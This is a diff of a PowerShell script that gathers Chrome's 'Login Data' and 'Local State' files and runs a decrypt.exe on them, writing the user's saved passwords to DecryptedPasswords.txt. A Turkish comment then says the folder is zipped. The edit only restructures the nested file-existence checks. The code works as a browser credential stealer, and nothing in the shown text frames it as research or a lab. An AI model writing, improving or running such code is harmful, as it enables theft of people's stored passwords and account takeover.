@@ -69,29 +69,29 @@ $loginDataPath = Join-Path -Path "$destDir\Chrome" -ChildPath "Login Data"
 $localStatePath = Join-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -ChildPath "Local State"
 
 # Separate Test-Path checks
-if (Test-Path $decryptExePath -and Test-Path $loginDataPath -and Test-Path $localStatePath) {
-    $outputPath = Join-Path -Path $destDir -ChildPath "DecryptedPasswords.txt"
-    
-    # Run the decrypt.exe
-    & $decryptExePath -1stfile $loginDataPath -2ndfile $localStatePath -output $outputPath
-    
-    if (Test-Path $outputPath) {
-        Write-Host "Decrypted passwords saved to: $outputPath"
+if (Test-Path $decryptExePath) {
+    if (Test-Path $loginDataPath) {
+        if (Test-Path $localStatePath) {
+            $outputPath = Join-Path -Path $destDir -ChildPath "DecryptedPasswords.txt"
+            
+            # Run the decrypt.exe
+            & $decryptExePath -1stfile $loginDataPath -2ndfile $localStatePath -output $outputPath
+            
+            if (Test-Path $outputPath) {
+                Write-Host "Decrypted passwords saved to: $outputPath"
+            } else {
+                Write-Host "Decrypted passwords not found."
+            }
+        } else {
+            Write-Host "Local State not found."
+        }
     } else {
-        Write-Host "Decrypted passwords not found."
-    }
-} else {
-    # Check each file individually
-    if (-Not (Test-Path $decryptExePath)) {
-        Write-Host "Decrypt.exe not found."
-    }
-    if (-Not (Test-Path $loginDataPath)) {
         Write-Host "Login Data not found."
     }
-    if (-Not (Test-Path $localStatePath)) {
-        Write-Host "Local State not found."
-    }
+} else {
+    Write-Host "Decrypt.exe not found."
 }
+
 
 
 # Klasörü ZIP dosyasına sıkıştırma
